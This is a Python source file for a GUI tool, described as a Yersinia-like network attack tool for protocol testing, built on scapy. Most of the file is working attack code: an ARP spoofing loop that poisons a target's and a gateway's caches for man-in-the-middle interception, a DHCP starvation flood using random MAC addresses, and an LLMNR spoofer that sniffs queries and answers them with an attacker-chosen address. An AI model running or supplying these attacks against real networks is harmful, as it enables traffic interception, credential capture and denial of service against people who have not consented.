#!/usr/bin/env python3
"""
Network Attack Tool - A GUI application for network protocol testing
Similar to Yersinia but with modern GUI and correct attack implementations
"""

import customtkinter as ctk
import threading
import logging
import random
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, Dot1Q
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.llmnr import LLMNRQuery, LLMNRResponse
from scapy.layers.dns import DNS, DNSRR
import netifaces
import psutil
import time
from datetime import datetime
import sys
import os
from packet_crafter import PacketCrafter

# Set appearance mode and color theme
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class NetworkAttackTool:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("Network Attack Tool")
        self.root.geometry("1200x800")
        
        # Attack state variables
        self.attack_running = False
        self.attack_thread = None
        self.selected_interface = None
        self.packet_crafter = None
        
        # Setup logging
        self.setup_logging()
        
        # Create GUI
        self.create_widgets()
        
        # Get network interfaces
        self.refresh_interfaces()
    
    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('network_attack_tool.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def create_widgets(self):
        """Create main GUI widgets"""
        
        # Main container
        main_container = ctk.CTkFrame(self.root)
        main_container.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Left panel for controls
        left_panel = ctk.CTkFrame(main_container, width=400)
        left_panel.pack(side="left", fill="y", padx=(0, 10))
        left_panel.pack_propagate(False)
        
        # Interface selection
        interface_frame = ctk.CTkFrame(left_panel)
        interface_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkLabel(interface_frame, text="Network Interface:", font=("Arial", 12, "bold")).pack(anchor="w", padx=5, pady=5)
        self.interface_combo = ctk.CTkComboBox(interface_frame, values=[], state="readonly")
        self.interface_combo.pack(fill="x", padx=5, pady=5)
        
        ctk.CTkButton(interface_frame, text="Refresh Interfaces", command=self.refresh_interfaces).pack(fill="x", padx=5, pady=5)
        
        # Attack modules
        attack_frame = ctk.CTkFrame(left_panel)
        attack_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkLabel(attack_frame, text="Attack Modules:", font=("Arial", 12, "bold")).pack(anchor="w", padx=5, pady=5)
        
        # ARP Spoofing
        arp_frame = ctk.CTkFrame(attack_frame)
        arp_frame.pack(fill="x", padx=5, pady=5)
        
        ctk.CTkLabel(arp_frame, text="ARP Spoofing", font=("Arial", 10, "bold")).pack(anchor="w", padx=5, pady=2)
        
        target_frame = ctk.CTkFrame(arp_frame)
        target_frame.pack(fill="x", padx=5, pady=2)
        
        ctk.CTkLabel(target_frame, text="Target IP:").pack(side="left", padx=2)
        self.arp_target_entry = ctk.CTkEntry(target_frame, width=120)
        self.arp_target_entry.pack(side="left", padx=2)
        
        ctk.CTkLabel(target_frame, text="Gateway IP:").pack(side="left", padx=2)
        self.arp_gateway_entry = ctk.CTkEntry(target_frame, width=120)
        self.arp_gateway_entry.pack(side="left", padx=2)
        
        self.arp_button = ctk.CTkButton(arp_frame, text="Start ARP Spoof", command=self.toggle_arp_spoof)
        self.arp_button.pack(fill="x", padx=5, pady=2)
        
        # DHCP Starvation
        dhcp_frame = ctk.CTkFrame(attack_frame)
        dhcp_frame.pack(fill="x", padx=5, pady=5)
        
        ctk.CTkLabel(dhcp_frame, text="DHCP Starvation", font=("Arial", 10, "bold")).pack(anchor="w", padx=5, pady=2)
        
        dhcp_count_frame = ctk.CTkFrame(dhcp_frame)
        dhcp_count_frame.pack(fill="x", padx=5, pady=2)
        
        ctk.CTkLabel(dhcp_count_frame, text="Requests:").pack(side="left", padx=2)
        self.dhcp_count_entry = ctk.CTkEntry(dhcp_count_frame, width=100)
        self.dhcp_count_entry.insert(0, "100")
        self.dhcp_count_entry.pack(side="left", padx=2)
        
        self.dhcp_button = ctk.CTkButton(dhcp_frame, text="Start DHCP Starvation", command=self.toggle_dhcp_starvation)
        self.dhcp_button.pack(fill="x", padx=5, pady=2)
        
        # LLMNR Spoofing
        llmnr_frame = ctk.CTkFrame(attack_frame)
        llmnr_frame.pack(fill="x", padx=5, pady=5)
        
        ctk.CTkLabel(llmnr_frame, text="LLMNR Spoofing", font=("Arial", 10, "bold")).pack(anchor="w", padx=5, pady=2)
        
        llmnr_target_frame = ctk.CTkFrame(llmnr_frame)
        llmnr_target_frame.pack(fill="x", padx=5, pady=2)
        
        ctk.CTkLabel(llmnr_target_frame, text="Target IP:").pack(side="left", padx=2)
        self.llmnr_target_entry = ctk.CTkEntry(llmnr_target_frame, width=120)
        self.llmnr_target_entry.pack(side="left", padx=2)
        
        self.llmnr_button = ctk.CTkButton(llmnr_frame, text="Start LLMNR Spoof", command=self.toggle_llmnr_spoof)
        self.llmnr_button.pack(fill="x", padx=5, pady=2)
        
        # Packet crafter button
        packet_frame = ctk.CTkFrame(left_panel)
        packet_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkButton(packet_frame, text="Packet Crafter", command=self.open_packet_crafter, 
                     font=("Arial", 12, "bold"), height=40).pack(fill="x", padx=5, pady=5)
        
        # Right panel for output
        right_panel = ctk.CTkFrame(main_container)
        right_panel.pack(side="right", fill="both", expand=True)
        
        # Output display
        output_frame = ctk.CTkFrame(right_panel)
        output_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ctk.CTkLabel(output_frame, text="Output Log:", font=("Arial", 12, "bold")).pack(anchor="w", padx=5, pady=5)
        
        # Create scrollable text widget
        self.output_text = ctk.CTkTextbox(output_frame)
        self.output_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Clear button
        ctk.CTkButton(output_frame, text="Clear Output", command=self.clear_output).pack(fill="x", padx=5, pady=5)
    
    def refresh_interfaces(self):
        """Refresh network interfaces list"""
        try:
            interfaces = []
            for interface in netifaces.interfaces():
                if netifaces.ifaddresses(interface).get(netifaces.AF_INET):
                    interfaces.append(interface)
            
            self.interface_combo.configure(values=interfaces)
            if interfaces:
                self.interface_combo.set(interfaces[0])
                self.selected_interface = interfaces[0]
            
            self.log_message(f"Found {len(interfaces)} network interfaces")
        except Exception as e:
            self.log_message(f"Error refreshing interfaces: {str(e)}")
    
    def log_message(self, message):
        """Add message to output log"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        self.output_text.insert("end", log_entry)
        self.output_text.see("end")
        self.logger.info(message)
    
    def clear_output(self):
        """Clear output log"""
        self.output_text.delete("1.0", "end")
    
    def toggle_arp_spoof(self):
        """Toggle ARP spoofing attack"""
        if not self.attack_running:
            target_ip = self.arp_target_entry.get()
            gateway_ip = self.arp_gateway_entry.get()
            
            if not target_ip or not gateway_ip:
                self.log_message("Error: Target and Gateway IP required")
                return
            
            if not self.selected_interface:
                self.log_message("Error: No network interface selected")
                return
            
            self.attack_running = True
            self.arp_button.configure(text="Stop ARP Spoof")
            
            self.attack_thread = threading.Thread(
                target=self.arp_spoof_attack,
                args=(target_ip, gateway_ip),
                daemon=True
            )
            self.attack_thread.start()
            
            self.log_message(f"Started ARP spoofing: {target_ip} <-> {gateway_ip}")
        else:
            self.attack_running = False
            self.arp_button.configure(text="Start ARP Spoof")
            self.log_message("Stopped ARP spoofing")
    
    def arp_spoof_attack(self, target_ip, gateway_ip):
        """Perform ARP spoofing attack"""
        try:
            # Get our MAC address
            our_mac = get_if_hwaddr(self.selected_interface)
            
            # Craft ARP packets
            arp_to_target = ARP(pdst=target_ip, psrc=gateway_ip, hwsrc=our_mac)
            arp_to_gateway = ARP(pdst=gateway_ip, psrc=target_ip, hwsrc=our_mac)
            
            while self.attack_running:
                send(arp_to_target, verbose=False)
                send(arp_to_gateway, verbose=False)
                time.sleep(2)
                
        except Exception as e:
            self.log_message(f"ARP spoofing error: {str(e)}")
            self.attack_running = False
            self.arp_button.configure(text="Start ARP Spoof")
    
    def toggle_dhcp_starvation(self):
        """Toggle DHCP starvation attack"""
        if not self.attack_running:
            try:
                count = int(self.dhcp_count_entry.get())
            except ValueError:
                self.log_message("Error: Invalid request count")
                return
            
            if not self.selected_interface:
                self.log_message("Error: No network interface selected")
                return
            
            self.attack_running = True
            self.dhcp_button.configure(text="Stop DHCP Starvation")
            
            self.attack_thread = threading.Thread(
                target=self.dhcp_starvation_attack,
                args=(count,),
                daemon=True
            )
            self.attack_thread.start()
            
            self.log_message(f"Started DHCP starvation: {count} requests")
        else:
            self.attack_running = False
            self.dhcp_button.configure(text="Start DHCP Starvation")
            self.log_message("Stopped DHCP starvation")
    
    def dhcp_starvation_attack(self, count):
        """Perform DHCP starvation attack"""
        try:
            for i in range(count):
                if not self.attack_running:
                    break
                
                # Generate random MAC address
                mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
                
                # Create DHCP discover packet
                dhcp_discover = Ether(src=mac) / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=mac) / DHCP(options=[("message-type", "discover"), "end"])
                
                sendp(dhcp_discover, iface=self.selected_interface, verbose=False)
                
                if i % 10 == 0:
                    self.log_message(f"Sent {i+1}/{count} DHCP discover packets")
                
                time.sleep(0.1)
                
        except Exception as e:
            self.log_message(f"DHCP starvation error: {str(e)}")
            self.attack_running = False
            self.dhcp_button.configure(text="Start DHCP Starvation")
    
    def toggle_llmnr_spoof(self):
        """Toggle LLMNR spoofing attack"""
        if not self.attack_running:
            target_ip = self.llmnr_target_entry.get()
            
            if not target_ip:
                self.log_message("Error: Target IP required")
                return
            
            if not self.selected_interface:
                self.log_message("Error: No network interface selected")
                return
            
            self.attack_running = True
            self.llmnr_button.configure(text="Stop LLMNR Spoof")
            
            self.attack_thread = threading.Thread(
                target=self.llmnr_spoof_attack,
                args=(target_ip,),
                daemon=True
            )
            self.attack_thread.start()
            
            self.log_message(f"Started LLMNR spoofing for target: {target_ip}")
        else:
            self.attack_running = False
            self.llmnr_button.configure(text="Start LLMNR Spoof")
            self.log_message("Stopped LLMNR spoofing")
    
    def llmnr_spoof_attack(self, target_ip):
        """Perform LLMNR spoofing attack"""
        try:
            def process_packet(packet):
                if not self.attack_running:
                    return
                
                if packet.haslayer(LLMNRQuery):
                    query_name = packet[LLMNRQuery].questions[0].qname
                    
                    # Craft malicious response
                    response = Ether(src=get_if_hwaddr(self.selected_interface), dst=packet[Ether].src)
                    response /= IP(src=target_ip, dst=packet[IP].src)
                    response /= UDP(sport=5355, dport=packet[UDP].sport)
                    response /= LLMNRResponse(id=packet[LLMNRQuery].id, qr=1, aa=1, ancount=1)
                    response /= DNSRR(rrname=query_name, rdata=target_ip)
                    
                    sendp(response, verbose=False)
                    self.log_message(f"Sent LLMNR response for {query_name.decode()} to {target_ip}")
            
            # Start packet sniffing
            sniff(filter="udp port 5355", prn=process_packet, store=False, stop_filter=lambda x: not self.attack_running)
            
        except Exception as e:
            self.log_message(f"LLMNR spoofing error: {str(e)}")
            self.attack_running = False
            self.llmnr_button.configure(text="Start LLMNR Spoof")
    
    def open_packet_crafter(self):
        """Open packet crafting interface"""
        if self.packet_crafter is None:
            self.packet_crafter = PacketCrafter(
                self.root, 
                self.log_message, 
                lambda: self.selected_interface
            )
        self.packet_crafter.show()
    
    def run(self):
        """Start the application"""
        self.root.mainloop()

if __name__ == "__main__":
    # Check for root/administrator privileges
    if os.name == 'nt':  # Windows
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("This application requires administrator privileges!")
            sys.exit(1)
    else:  # Unix/Linux
        if os.geteuid() != 0:
            print("This application requires root privileges!")
            sys.exit(1)
    
    app = NetworkAttackTool()
    app.run()
